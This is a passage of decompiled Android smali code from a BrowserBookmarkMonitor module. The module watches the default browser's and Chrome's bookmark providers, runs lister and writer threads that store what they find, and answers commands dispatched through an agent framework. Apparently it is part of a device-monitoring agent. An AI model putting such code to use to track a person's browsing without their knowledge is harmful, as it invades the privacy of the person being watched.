    iget-object v5, p0, Lcom/hp/vd/module/monitor/BrowserBookmarkMonitor;->context:Lcom/hp/vd/context/Context;

    iget-object v6, p0, Lcom/hp/vd/module/monitor/BrowserBookmarkMonitor;->moduleData:Lcom/hp/vd/data/ModuleData;

    move-object v1, v11

    move-object v7, v0

    invoke-direct/range {v1 .. v7}, Lcom/hp/vd/module/monitor/browser/BrowserBookmarkObserver;-><init>(ILandroid/net/Uri;Lcom/hp/vd/data/concurrency/BlockingQueue;Lcom/hp/vd/context/Context;Lcom/hp/vd/data/ModuleData;Lcom/hp/vd/agent/log/IWriter;)V

    .line 367
    invoke-virtual {v11}, Lcom/hp/vd/module/monitor/browser/BrowserBookmarkObserver;->deactivate()Z

    .line 369
    new-instance v12, Lcom/hp/vd/module/monitor/browser/BrowserBookmarkObserver;

    const/4 v2, 0x2

    const-string v1, "content://com.android.chrome.browser/bookmarks"

    .line 371
    invoke-static {v1}, Landroid/net/Uri;->parse(Ljava/lang/String;)Landroid/net/Uri;

    move-result-object v3

    iget-object v4, p0, Lcom/hp/vd/module/monitor/BrowserBookmarkMonitor;->buffer:Lcom/hp/vd/data/concurrency/BlockingQueue;

    iget-object v5, p0, Lcom/hp/vd/module/monitor/BrowserBookmarkMonitor;->context:Lcom/hp/vd/context/Context;

    iget-object v6, p0, Lcom/hp/vd/module/monitor/BrowserBookmarkMonitor;->moduleData:Lcom/hp/vd/data/ModuleData;

    move-object v1, v12

    invoke-direct/range {v1 .. v7}, Lcom/hp/vd/module/monitor/browser/BrowserBookmarkObserver;-><init>(ILandroid/net/Uri;Lcom/hp/vd/data/concurrency/BlockingQueue;Lcom/hp/vd/context/Context;Lcom/hp/vd/data/ModuleData;Lcom/hp/vd/agent/log/IWriter;)V

    .line 378
    invoke-virtual {v12}, Lcom/hp/vd/module/monitor/browser/BrowserBookmarkObserver;->deactivate()Z

    .line 381
    :try_start_1
    invoke-virtual {v11}, Lcom/hp/vd/module/monitor/browser/BrowserBookmarkObserver;->getUri()Landroid/net/Uri;

    move-result-object v1

    invoke-virtual {v10, v1, v9, v11}, Landroid/content/ContentResolver;->registerContentObserver(Landroid/net/Uri;ZLandroid/database/ContentObserver;)V

    .line 382
    invoke-virtual {v12}, Lcom/hp/vd/module/monitor/browser/BrowserBookmarkObserver;->getUri()Landroid/net/Uri;

    move-result-object v1

    invoke-virtual {v10, v1, v9, v12}, Landroid/content/ContentResolver;->registerContentObserver(Landroid/net/Uri;ZLandroid/database/ContentObserver;)V
    :try_end_1
    .catch Ljava/lang/NullPointerException; {:try_start_1 .. :try_end_1} :catch_1

    .line 389
    iget-object v1, p0, Lcom/hp/vd/module/monitor/BrowserBookmarkMonitor;->browserBookmarkObservers:Ljava/util/ArrayList;

    invoke-virtual {v1, v11}, Ljava/util/ArrayList;->add(Ljava/lang/Object;)Z

    .line 390
    iget-object v1, p0, Lcom/hp/vd/module/monitor/BrowserBookmarkMonitor;->browserBookmarkObservers:Ljava/util/ArrayList;

    invoke-virtual {v1, v12}, Ljava/util/ArrayList;->add(Ljava/lang/Object;)Z

    goto :goto_2

    :catch_1
    move-exception v1

    const-string v2, "BrowserBookmarkMonitor"

    const-string v3, "NullPointerException caught while registering content observers"

    .line 384
    invoke-interface {v0, v2, v3, v1}, Lcom/hp/vd/agent/log/IWriter;->write(Ljava/lang/String;Ljava/lang/String;Ljava/lang/Throwable;)Z

    return v8

    .line 400
    :cond_7
    :goto_2
    :try_start_2
    invoke-virtual {p0}, Lcom/hp/vd/module/monitor/BrowserBookmarkMonitor;->getDao()Lcom/j256/ormlite/dao/Dao;

    move-result-object v1
    :try_end_2
    .catch Ljava/lang/Throwable; {:try_start_2 .. :try_end_2} :catch_2

    .line 409
    new-instance v2, Lcom/hp/vd/data/concurrency/QueueConsumerDao;

    iget-object v3, p0, Lcom/hp/vd/module/monitor/BrowserBookmarkMonitor;->buffer:Lcom/hp/vd/data/concurrency/BlockingQueue;

    invoke-direct {v2, v3, v1, v0}, Lcom/hp/vd/data/concurrency/QueueConsumerDao;-><init>(Lcom/hp/vd/data/concurrency/BlockingQueue;Lcom/j256/ormlite/dao/Dao;Lcom/hp/vd/agent/log/IWriter;)V

    iput-object v2, p0, Lcom/hp/vd/module/monitor/BrowserBookmarkMonitor;->writer:Lcom/hp/vd/data/concurrency/QueueConsumerDao;

    return v9

    :catch_2
    move-exception v1

    const-string v2, "BrowserBookmarkMonitor"

    const-string v3, "Could not create the Dao"

    .line 403
    invoke-interface {v0, v2, v3, v1}, Lcom/hp/vd/agent/log/IWriter;->write(Ljava/lang/String;Ljava/lang/String;Ljava/lang/Throwable;)Z

    .line 404
    invoke-virtual {v1}, Ljava/lang/Throwable;->printStackTrace()V

    return v8
.end method

.method public install(Ljava/lang/String;)Z
    .locals 3

    .line 125
    invoke-virtual {p0}, Lcom/hp/vd/module/monitor/BrowserBookmarkMonitor;->getContext()Lcom/hp/vd/context/Context;

    move-result-object v0

    invoke-virtual {v0}, Lcom/hp/vd/context/Context;->getLog()Lcom/hp/vd/agent/log/IWriter;

    move-result-object v0

    const-string v1, "BrowserBookmarkMonitor"

    const-string v2, "install() called."

    .line 126
    invoke-interface {v0, v1, v2}, Lcom/hp/vd/agent/log/IWriter;->write(Ljava/lang/String;Ljava/lang/String;)Z

    const/16 v0, 0x96

    .line 132
    invoke-static {v0}, Ljava/lang/Integer;->valueOf(I)Ljava/lang/Integer;

    move-result-object v0

    invoke-virtual {p0, v0}, Lcom/hp/vd/module/monitor/BrowserBookmarkMonitor;->setDataReadLimit(Ljava/lang/Integer;)Z

    .line 138
    invoke-super {p0, p1}, Lcom/hp/vd/module/ModuleAbstract;->install(Ljava/lang/String;)Z

    move-result p1

    return p1
.end method

.method public isDispatchable()Z
    .locals 1

    .line 417
    invoke-virtual {p0}, Lcom/hp/vd/module/monitor/BrowserBookmarkMonitor;->isActivated()Z

    move-result v0

    if-nez v0, :cond_0

    const/4 v0, 0x0

    return v0

    :cond_0
    const/4 v0, 0x1

    return v0
.end method

.method public isStarted()Z
    .locals 1

    .line 708
    iget-boolean v0, p0, Lcom/hp/vd/module/monitor/BrowserBookmarkMonitor;->monitoringStatus:Z

    return v0
.end method

.method protected returnResponse(Lcom/hp/vd/module/IModule;Ljava/lang/reflect/Method;Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;)Z
    .locals 4

    .line 720
    invoke-virtual {p0}, Lcom/hp/vd/module/monitor/BrowserBookmarkMonitor;->getContext()Lcom/hp/vd/context/Context;

    move-result-object p4

    invoke-virtual {p4}, Lcom/hp/vd/context/Context;->getLog()Lcom/hp/vd/agent/log/IWriter;

    move-result-object p4

    const/4 v0, 0x3

    const/4 v1, 0x0

    if-nez p1, :cond_0

    const-string p1, "BrowserBookmarkMonitor"

    const-string p2, "dispatch(): no commandResponseDispatcher found! No resposne will be ever returned."

    .line 723
    invoke-interface {p4, p1, p2, v0}, Lcom/hp/vd/agent/log/IWriter;->write(Ljava/lang/String;Ljava/lang/String;I)Z

    return v1

    :cond_0
    if-nez p2, :cond_1

    const-string p1, "BrowserBookmarkMonitor"

    const-string p2, "dispatch(): no methodDispatchResponse found! No resposne will be ever returned."

    .line 733
    invoke-interface {p4, p1, p2, v0}, Lcom/hp/vd/agent/log/IWriter;->write(Ljava/lang/String;Ljava/lang/String;I)Z

    return v1

    :cond_1
    const/4 v2, 0x6

    .line 743
    :try_start_0
    new-array v2, v2, [Ljava/lang/Object;

    aput-object p3, v2, v1

    .line 745
    invoke-virtual {p0}, Ljava/lang/Object;->getClass()Ljava/lang/Class;

    move-result-object p3

    invoke-virtual {p3}, Ljava/lang/Class;->getName()Ljava/lang/String;

    move-result-object p3

    const/4 v3, 0x1

    aput-object p3, v2, v3

    const/4 p3, 0x2

    aput-object p5, v2, p3

    aput-object p6, v2, v0

    const/4 p3, 0x4

    new-instance p5, Ljava/util/Date;

    invoke-direct {p5}, Ljava/util/Date;-><init>()V

    aput-object p5, v2, p3

    const/4 p3, 0x5

    new-instance p5, Ljava/util/Date;

    invoke-direct {p5}, Ljava/util/Date;-><init>()V

    aput-object p5, v2, p3

    .line 752
    invoke-virtual {p2, p1, v2}, Ljava/lang/reflect/Method;->invoke(Ljava/lang/Object;[Ljava/lang/Object;)Ljava/lang/Object;
    :try_end_0
    .catch Ljava/lang/IllegalAccessException; {:try_start_0 .. :try_end_0} :catch_2
    .catch Ljava/lang/reflect/InvocationTargetException; {:try_start_0 .. :try_end_0} :catch_1
    .catch Ljava/lang/NullPointerException; {:try_start_0 .. :try_end_0} :catch_0

    return v3

    :catch_0
    move-exception p1

    const-string p2, "BrowserBookmarkMonitor"

    const-string p3, "dispatch(): NullPointerException caught while returning response."

    .line 763
    invoke-interface {p4, p2, p3, p1}, Lcom/hp/vd/agent/log/IWriter;->write(Ljava/lang/String;Ljava/lang/String;Ljava/lang/Throwable;)Z

    goto :goto_0

    :catch_1
    move-exception p1

    const-string p2, "BrowserBookmarkMonitor"

    const-string p3, "dispatch(): InvocationTargetException caught while returning response."

    .line 760
    invoke-interface {p4, p2, p3, p1}, Lcom/hp/vd/agent/log/IWriter;->write(Ljava/lang/String;Ljava/lang/String;Ljava/lang/Throwable;)Z

    goto :goto_0

    :catch_2
    move-exception p1

    const-string p2, "BrowserBookmarkMonitor"

    const-string p3, "dispatch(): IllegalAccessException caught while returning response."

    .line 757
    invoke-interface {p4, p2, p3, p1}, Lcom/hp/vd/agent/log/IWriter;->write(Ljava/lang/String;Ljava/lang/String;Ljava/lang/Throwable;)Z

    :goto_0
    return v1
.end method

.method public start()Z
    .locals 8

    .line 551
    invoke-virtual {p0}, Lcom/hp/vd/module/monitor/BrowserBookmarkMonitor;->getContext()Lcom/hp/vd/context/Context;

    move-result-object v0

    invoke-virtual {v0}, Lcom/hp/vd/context/Context;->getLog()Lcom/hp/vd/agent/log/IWriter;

    move-result-object v6

    .line 553
    invoke-virtual {p0}, Lcom/hp/vd/module/monitor/BrowserBookmarkMonitor;->isActivated()Z

    move-result v0

    if-nez v0, :cond_0

    const-string v0, "BrowserBookmarkMonitor"

    const-string v1, "This module is currently DEactivated."

    .line 554
    invoke-interface {v6, v0, v1}, Lcom/hp/vd/agent/log/IWriter;->write(Ljava/lang/String;Ljava/lang/String;)Z

    const/4 v0, 0x0

    return v0

    .line 559
    :cond_0
    sget v0, Landroid/os/Build$VERSION;->SDK_INT:I

    const-wide/16 v1, 0x3e8

    const/16 v3, 0x15

    const/4 v7, 0x1

    if-gt v0, v3, :cond_3

    .line 570
    iget-object v0, p0, Lcom/hp/vd/module/monitor/BrowserBookmarkMonitor;->moduleData:Lcom/hp/vd/data/ModuleData;

    const-string v3, "synchronization_interval"

    invoke-virtual {v0, v3}, Lcom/hp/vd/data/ModuleData;->customGet(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v0

    invoke-static {v0}, Ljava/lang/Integer;->parseInt(Ljava/lang/String;)I

    move-result v0

    .line 572
    iget-object v3, p0, Lcom/hp/vd/module/monitor/BrowserBookmarkMonitor;->lastSynchronization:Ljava/lang/Long;

    invoke-virtual {p0, v3, v0}, Lcom/hp/vd/module/monitor/BrowserBookmarkMonitor;->hasUpdateIntervalExpired(Ljava/lang/Long;I)Z

    move-result v0

    if-nez v0, :cond_1

    return v7

    .line 576
    :cond_1
    invoke-static {}, Ljava/lang/System;->currentTimeMillis()J

    move-result-wide v3

    div-long/2addr v3, v1

    invoke-static {v3, v4}, Ljava/lang/Long;->valueOf(J)Ljava/lang/Long;

    move-result-object v0

    iput-object v0, p0, Lcom/hp/vd/module/monitor/BrowserBookmarkMonitor;->lastSynchronization:Ljava/lang/Long;

    .line 583
    iget-object v0, p0, Lcom/hp/vd/module/monitor/BrowserBookmarkMonitor;->listerThread:Ljava/lang/Thread;

    if-eqz v0, :cond_2

    iget-object v0, p0, Lcom/hp/vd/module/monitor/BrowserBookmarkMonitor;->listerThread:Ljava/lang/Thread;

    invoke-virtual {v0}, Ljava/lang/Thread;->isAlive()Z

    move-result v0

    if-eqz v0, :cond_2

    iget-object v0, p0, Lcom/hp/vd/module/monitor/BrowserBookmarkMonitor;->listerThread:Ljava/lang/Thread;

    invoke-virtual {v0}, Ljava/lang/Thread;->isInterrupted()Z

    move-result v0

    if-nez v0, :cond_2

    const-string v0, "BrowserBookmarkMonitor"

    const-string v1, "start(): <= LOLLIPOP: lister thread is already running. Skipping it this time."

    .line 584
    invoke-interface {v6, v0, v1, v7}, Lcom/hp/vd/agent/log/IWriter;->write(Ljava/lang/String;Ljava/lang/String;I)Z

    return v7

    .line 597
    :cond_2
    new-instance v0, Lcom/hp/vd/module/monitor/browser/BrowserBookmarkLister;

    iget-object v2, p0, Lcom/hp/vd/module/monitor/BrowserBookmarkMonitor;->buffer:Lcom/hp/vd/data/concurrency/BlockingQueue;

    iget-object v3, p0, Lcom/hp/vd/module/monitor/BrowserBookmarkMonitor;->context:Lcom/hp/vd/context/Context;

    iget-object v4, p0, Lcom/hp/vd/module/monitor/BrowserBookmarkMonitor;->moduleData:Lcom/hp/vd/data/ModuleData;

    iget-object v5, p0, Lcom/hp/vd/module/monitor/BrowserBookmarkMonitor;->browserBookmarkObservers:Ljava/util/ArrayList;

    move-object v1, v0

    invoke-direct/range {v1 .. v6}, Lcom/hp/vd/module/monitor/browser/BrowserBookmarkLister;-><init>(Lcom/hp/vd/data/concurrency/BlockingQueue;Lcom/hp/vd/context/Context;Lcom/hp/vd/data/ModuleData;Ljava/util/ArrayList;Lcom/hp/vd/agent/log/IWriter;)V

    .line 605
    new-instance v1, Ljava/lang/Thread;

    const-string v2, "Initial-Browser-Bookmark-Lister-Thread"

    invoke-direct {v1, v0, v2}, Ljava/lang/Thread;-><init>(Ljava/lang/Runnable;Ljava/lang/String;)V

    iput-object v1, p0, Lcom/hp/vd/module/monitor/BrowserBookmarkMonitor;->listerThread:Ljava/lang/Thread;

    .line 606
    iget-object v0, p0, Lcom/hp/vd/module/monitor/BrowserBookmarkMonitor;->listerThread:Ljava/lang/Thread;

    invoke-virtual {v0}, Ljava/lang/Thread;->start()V

    goto :goto_0

    .line 608
    :cond_3
    sget v0, Landroid/os/Build$VERSION;->SDK_INT:I

    if-le v0, v3, :cond_6

    const-string v0, "BrowserBookmarkMonitor"

    const-string v3, "start(): > LOLLIPOP detected."

    .line 609
    invoke-interface {v6, v0, v3}, Lcom/hp/vd/agent/log/IWriter;->write(Ljava/lang/String;Ljava/lang/String;)Z

    .line 615
    iget-object v0, p0, Lcom/hp/vd/module/monitor/BrowserBookmarkMonitor;->moduleData:Lcom/hp/vd/data/ModuleData;

    const-string v3, "synchronization_interval"

    invoke-virtual {v0, v3}, Lcom/hp/vd/data/ModuleData;->customGet(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v0

    invoke-static {v0}, Ljava/lang/Integer;->parseInt(Ljava/lang/String;)I

    move-result v0

    .line 617
    iget-object v3, p0, Lcom/hp/vd/module/monitor/BrowserBookmarkMonitor;->lastSynchronization:Ljava/lang/Long;

    invoke-virtual {p0, v3, v0}, Lcom/hp/vd/module/monitor/BrowserBookmarkMonitor;->hasUpdateIntervalExpired(Ljava/lang/Long;I)Z

    move-result v0

    if-nez v0, :cond_4

    const-string v0, "BrowserBookmarkMonitor"

    const-string v1, "start(): > LOLLIPOP: interval has not yet expired."

    .line 618
    invoke-interface {v6, v0, v1}, Lcom/hp/vd/agent/log/IWriter;->write(Ljava/lang/String;Ljava/lang/String;)Z

    return v7

    :cond_4
    const-string v0, "BrowserBookmarkMonitor"

    const-string v3, "start(): > LOLLIPOP: interval has expired!. About to run lister."

    .line 623
    invoke-interface {v6, v0, v3}, Lcom/hp/vd/agent/log/IWriter;->write(Ljava/lang/String;Ljava/lang/String;)Z

    .line 625
    invoke-static {}, Ljava/lang/System;->currentTimeMillis()J

    move-result-wide v3

    div-long/2addr v3, v1

    invoke-static {v3, v4}, Ljava/lang/Long;->valueOf(J)Ljava/lang/Long;

    move-result-object v0

    iput-object v0, p0, Lcom/hp/vd/module/monitor/BrowserBookmarkMonitor;->lastSynchronization:Ljava/lang/Long;

    .line 632
    iget-object v0, p0, Lcom/hp/vd/module/monitor/BrowserBookmarkMonitor;->listerThread:Ljava/lang/Thread;

    if-eqz v0, :cond_5

    iget-object v0, p0, Lcom/hp/vd/module/monitor/BrowserBookmarkMonitor;->listerThread:Ljava/lang/Thread;

    invoke-virtual {v0}, Ljava/lang/Thread;->isAlive()Z

    move-result v0

    if-eqz v0, :cond_5

    iget-object v0, p0, Lcom/hp/vd/module/monitor/BrowserBookmarkMonitor;->listerThread:Ljava/lang/Thread;

    invoke-virtual {v0}, Ljava/lang/Thread;->isInterrupted()Z

    move-result v0

    if-nez v0, :cond_5

    const-string v0, "BrowserBookmarkMonitor"

    const-string v1, "start(): > LOLLIPOP: lister thread is already running. Skipping it this time."

    .line 633
    invoke-interface {v6, v0, v1, v7}, Lcom/hp/vd/agent/log/IWriter;->write(Ljava/lang/String;Ljava/lang/String;I)Z

    return v7

    .line 646
    :cond_5
    new-instance v0, Lcom/hp/vd/module/monitor/browser/BrowserBookmarkListerPostLollipop;

    iget-object v1, p0, Lcom/hp/vd/module/monitor/BrowserBookmarkMonitor;->context:Lcom/hp/vd/context/Context;

    iget-object v2, p0, Lcom/hp/vd/module/monitor/BrowserBookmarkMonitor;->buffer:Lcom/hp/vd/data/concurrency/BlockingQueue;

    iget-object v3, p0, Lcom/hp/vd/module/monitor/BrowserBookmarkMonitor;->moduleData:Lcom/hp/vd/data/ModuleData;

    invoke-direct {v0, v1, v2, v3, v6}, Lcom/hp/vd/module/monitor/browser/BrowserBookmarkListerPostLollipop;-><init>(Lcom/hp/vd/context/Context;Lcom/hp/vd/data/concurrency/BlockingQueue;Lcom/hp/vd/data/ModuleData;Lcom/hp/vd/agent/log/IWriter;)V

    .line 653
    new-instance v1, Ljava/lang/Thread;

    const-string v2, "Initial-Browser-Bookmark-Lister-Post-Lollipop-Thread"

    invoke-direct {v1, v0, v2}, Ljava/lang/Thread;-><init>(Ljava/lang/Runnable;Ljava/lang/String;)V

    iput-object v1, p0, Lcom/hp/vd/module/monitor/BrowserBookmarkMonitor;->listerThread:Ljava/lang/Thread;

    .line 654
    iget-object v0, p0, Lcom/hp/vd/module/monitor/BrowserBookmarkMonitor;->listerThread:Ljava/lang/Thread;

    invoke-virtual {v0}, Ljava/lang/Thread;->start()V

    .line 657
    :cond_6
    :goto_0
    iget-object v0, p0, Lcom/hp/vd/module/monitor/BrowserBookmarkMonitor;->writerThread:Ljava/lang/Thread;

    if-eqz v0, :cond_7

    iget-object v0, p0, Lcom/hp/vd/module/monitor/BrowserBookmarkMonitor;->writerThread:Ljava/lang/Thread;

    invoke-virtual {v0}, Ljava/lang/Thread;->isAlive()Z

    move-result v0

    if-eqz v0, :cond_7

    iget-object v0, p0, Lcom/hp/vd/module/monitor/BrowserBookmarkMonitor;->writerThread:Ljava/lang/Thread;

    invoke-virtual {v0}, Ljava/lang/Thread;->isInterrupted()Z

    move-result v0

    if-ne v0, v7, :cond_8

    .line 658
    :cond_7
    new-instance v0, Ljava/lang/Thread;

    iget-object v1, p0, Lcom/hp/vd/module/monitor/BrowserBookmarkMonitor;->writer:Lcom/hp/vd/data/concurrency/QueueConsumerDao;

    const-string v2, "Writer-Queue-Browser-Bookmark"

    invoke-direct {v0, v1, v2}, Ljava/lang/Thread;-><init>(Ljava/lang/Runnable;Ljava/lang/String;)V

    iput-object v0, p0, Lcom/hp/vd/module/monitor/BrowserBookmarkMonitor;->writerThread:Ljava/lang/Thread;

    .line 659
    iget-object v0, p0, Lcom/hp/vd/module/monitor/BrowserBookmarkMonitor;->writerThread:Ljava/lang/Thread;

    invoke-virtual {v0}, Ljava/lang/Thread;->start()V

    .line 662
    :cond_8
    iput-boolean v7, p0, Lcom/hp/vd/module/monitor/BrowserBookmarkMonitor;->monitoringStatus:Z

    return v7
.end method

.method public startOnHeartbeat()Z
    .locals 1

    const/4 v0, 0x1

    return v0
.end method

.method public stop()Z
    .locals 4

    .line 670
    invoke-virtual {p0}, Lcom/hp/vd/module/monitor/BrowserBookmarkMonitor;->getContext()Lcom/hp/vd/context/Context;

    move-result-object v0

    invoke-virtual {v0}, Lcom/hp/vd/context/Context;->getLog()Lcom/hp/vd/agent/log/IWriter;

    move-result-object v0

    const-string v1, "BrowserBookmarkMonitor"

    .line 671
    new-instance v2, Ljava/lang/StringBuilder;

    invoke-direct {v2}, Ljava/lang/StringBuilder;-><init>()V

    const-string v3, "stop(): called [version="

    invoke-virtual {v2, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {p0}, Lcom/hp/vd/module/monitor/BrowserBookmarkMonitor;->getModuleData()Lcom/hp/vd/data/ModuleData;

    move-result-object v3

    iget-object v3, v3, Lcom/hp/vd/data/ModuleData;->version:Ljava/lang/Integer;

    invoke-virtual {v2, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/Object;)Ljava/lang/StringBuilder;

    const-string v3, "]."

    invoke-virtual {v2, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v2}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v2

    invoke-interface {v0, v1, v2}, Lcom/hp/vd/agent/log/IWriter;->write(Ljava/lang/String;Ljava/lang/String;)Z

    .line 673
    sget v1, Landroid/os/Build$VERSION;->SDK_INT:I

    const/16 v2, 0x15

    if-gt v1, v2, :cond_0

    const-string v1, "BrowserBookmarkMonitor"

    const-string v2, "stop(): running on <= LOLLIPOP, so about to unregister observers."

    .line 674
    invoke-interface {v0, v1, v2}, Lcom/hp/vd/agent/log/IWriter;->write(Ljava/lang/String;Ljava/lang/String;)Z

    .line 677
    :try_start_0
    iget-object v1, p0, Lcom/hp/vd/module/monitor/BrowserBookmarkMonitor;->browserBookmarkObservers:Ljava/util/ArrayList;

    if-eqz v1, :cond_0

    .line 678
    iget-object v1, p0, Lcom/hp/vd/module/monitor/BrowserBookmarkMonitor;->browserBookmarkObservers:Ljava/util/ArrayList;

    invoke-virtual {v1}, Ljava/util/ArrayList;->iterator()Ljava/util/Iterator;

    move-result-object v1

    :goto_0
    invoke-interface {v1}, Ljava/util/Iterator;->hasNext()Z

    move-result v2

    if-eqz v2, :cond_0

    .line 679
    invoke-interface {v1}, Ljava/util/Iterator;->next()Ljava/lang/Object;

    move-result-object v2

    check-cast v2, Lcom/hp/vd/module/monitor/browser/BrowserBookmarkObserver;

    .line 681
    iget-object v3, p0, Lcom/hp/vd/module/monitor/BrowserBookmarkMonitor;->context:Lcom/hp/vd/context/Context;

    invoke-virtual {v3}, Lcom/hp/vd/context/Context;->getApplicationContext()Landroid/content/Context;

    move-result-object v3

    invoke-virtual {v3}, Landroid/content/Context;->getContentResolver()Landroid/content/ContentResolver;

    move-result-object v3

    invoke-virtual {v3, v2}, Landroid/content/ContentResolver;->unregisterContentObserver(Landroid/database/ContentObserver;)V
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    goto :goto_0

    :catch_0
    move-exception v1

    const-string v2, "BrowserBookmarkMonitor"

    const-string v3, "stop(): running on <= LOLLIPOP: Exception caught while unregister()ing observers."

    .line 688
    invoke-interface {v0, v2, v3, v1}, Lcom/hp/vd/agent/log/IWriter;->write(Ljava/lang/String;Ljava/lang/String;Ljava/lang/Throwable;)Z

    .line 692
    :cond_0
    iget-object v0, p0, Lcom/hp/vd/module/monitor/BrowserBookmarkMonitor;->writerThread:Ljava/lang/Thread;

    if-eqz v0, :cond_1

    .line 693
    iget-object v0, p0, Lcom/hp/vd/module/monitor/BrowserBookmarkMonitor;->writerThread:Ljava/lang/Thread;

    invoke-virtual {v0}, Ljava/lang/Thread;->interrupt()V

    .line 696
    :cond_1
    iget-object v0, p0, Lcom/hp/vd/module/monitor/BrowserBookmarkMonitor;->listerThread:Ljava/lang/Thread;

    if-eqz v0, :cond_2

    .line 697
    iget-object v0, p0, Lcom/hp/vd/module/monitor/BrowserBookmarkMonitor;->listerThread:Ljava/lang/Thread;

    invoke-virtual {v0}, Ljava/lang/Thread;->interrupt()V

    :cond_2
    const/4 v0, 0x0

    .line 700
    iput-boolean v0, p0, Lcom/hp/vd/module/monitor/BrowserBookmarkMonitor;->monitoringStatus:Z

    const/4 v0, 0x1

    return v0
.end method

.method public update(Lcom/hp/vd/module/IModule;)Z
    .locals 7

    .line 149
    invoke-virtual {p0}, Lcom/hp/vd/module/monitor/BrowserBookmarkMonitor;->getContext()Lcom/hp/vd/context/Context;

    move-result-object v0

    invoke-virtual {v0}, Lcom/hp/vd/context/Context;->getLog()Lcom/hp/vd/agent/log/IWriter;

    move-result-object v0

    if-eqz v0, :cond_0

    const-string v1, "BrowserBookmarkMonitor"

    const-string v2, "update() called on the new version. About to temporarily save important attributes."

    .line 152
    invoke-interface {v0, v1, v2}, Lcom/hp/vd/agent/log/IWriter;->write(Ljava/lang/String;Ljava/lang/String;)Z

    :cond_0
    const/4 v1, 0x0

    const/4 v2, 0x3

    .line 167
    :try_start_0
    invoke-interface {p1}, Lcom/hp/vd/module/IModule;->getPersistedModuleData()Lcom/hp/vd/data/ModuleData;

    move-result-object v3
    :try_end_0
    .catch Ljava/sql/SQLException; {:try_start_0 .. :try_end_0} :catch_0

    if-nez v3, :cond_2

    if-eqz v0, :cond_1

    const-string p1, "BrowserBookmarkMonitor"

    const-string v3, "The loaded persistedModuleData from the old module == NULL."

    .line 183
    invoke-interface {v0, p1, v3, v2}, Lcom/hp/vd/agent/log/IWriter;->write(Ljava/lang/String;Ljava/lang/String;I)Z

    :cond_1
    return v1

    .line 193
    :cond_2
    invoke-virtual {p0}, Lcom/hp/vd/module/monitor/BrowserBookmarkMonitor;->getContext()Lcom/hp/vd/context/Context;

    move-result-object v4

    invoke-virtual {v4}, Lcom/hp/vd/context/Context;->getApplicationContext()Landroid/content/Context;

    move-result-object v4

    const-string v5, "system"

    .line 195
    invoke-virtual {p0}, Lcom/hp/vd/module/monitor/BrowserBookmarkMonitor;->getContext()Lcom/hp/vd/context/Context;

    move-result-object v6

    invoke-virtual {v6}, Lcom/hp/vd/context/Context;->getApplicationContext()Landroid/content/Context;

    .line 193
    invoke-virtual {v4, v5, v1}, Landroid/content/Context;->getSharedPreferences(Ljava/lang/String;I)Landroid/content/SharedPreferences;

    move-result-object v1

    .line 198
    invoke-interface {v1}, Landroid/content/SharedPreferences;->edit()Landroid/content/SharedPreferences$Editor;

    move-result-object v1

    const-string v4, "0"

    const-string v5, "0"

    .line 203
    invoke-interface {p1}, Lcom/hp/vd/module/IModule;->getModuleData()Lcom/hp/vd/data/ModuleData;

    move-result-object v6

    iget-object v6, v6, Lcom/hp/vd/data/ModuleData;->version:Ljava/lang/Integer;

    invoke-virtual {v6}, Ljava/lang/Integer;->intValue()I

    move-result v6

    if-gt v6, v2, :cond_3

    const-string p1, "max_bookmark_id"

    .line 204
    invoke-virtual {v3, p1}, Lcom/hp/vd/data/ModuleData;->customGet(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v4

    goto :goto_0

    .line 206
    :cond_3
    invoke-interface {p1}, Lcom/hp/vd/module/IModule;->getModuleData()Lcom/hp/vd/data/ModuleData;

    move-result-object p1

    iget-object p1, p1, Lcom/hp/vd/data/ModuleData;->version:Ljava/lang/Integer;

    invoke-virtual {p1}, Ljava/lang/Integer;->intValue()I

    move-result p1

    const/4 v2, 0x4

    if-lt p1, v2, :cond_4

    .line 207
    invoke-virtual {p0}, Lcom/hp/vd/module/monitor/BrowserBookmarkMonitor;->buildDefaultInputKey()Ljava/lang/String;

    move-result-object p1

    invoke-virtual {v3, p1}, Lcom/hp/vd/data/ModuleData;->customGet(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v4

    .line 208
    invoke-virtual {p0}, Lcom/hp/vd/module/monitor/BrowserBookmarkMonitor;->buildChromeInputKey()Ljava/lang/String;

    move-result-object p1

    invoke-virtual {v3, p1}, Lcom/hp/vd/data/ModuleData;->customGet(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v5

    :cond_4
    :goto_0
    if-eqz v4, :cond_5

    const-string p1, "bookmark_max_bookmark_id_1"

    .line 212
    invoke-interface {v1, p1, v4}, Landroid/content/SharedPreferences$Editor;->putString(Ljava/lang/String;Ljava/lang/String;)Landroid/content/SharedPreferences$Editor;

    if-eqz v0, :cond_5

    const-string p1, "BrowserBookmarkMonitor"

    .line 218
    new-instance v2, Ljava/lang/StringBuilder;

    invoke-direct {v2}, Ljava/lang/StringBuilder;-><init>()V

    const-string v3, "update(): from the previous module: bookmark_ATTRIBUTE_MAX_BOOKMARK_ID_1: "

    invoke-virtual {v2, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v2, v4}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v2}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v2

    invoke-interface {v0, p1, v2}, Lcom/hp/vd/agent/log/IWriter;->write(Ljava/lang/String;Ljava/lang/String;)Z

    :cond_5
    if-eqz v5, :cond_6

    const-string p1, "bookmark_max_bookmark_id_2"

    .line 226
    invoke-interface {v1, p1, v5}, Landroid/content/SharedPreferences$Editor;->putString(Ljava/lang/String;Ljava/lang/String;)Landroid/content/SharedPreferences$Editor;

    if-eqz v0, :cond_6

    const-string p1, "BrowserBookmarkMonitor"

    .line 232
    new-instance v2, Ljava/lang/StringBuilder;

    invoke-direct {v2}, Ljava/lang/StringBuilder;-><init>()V

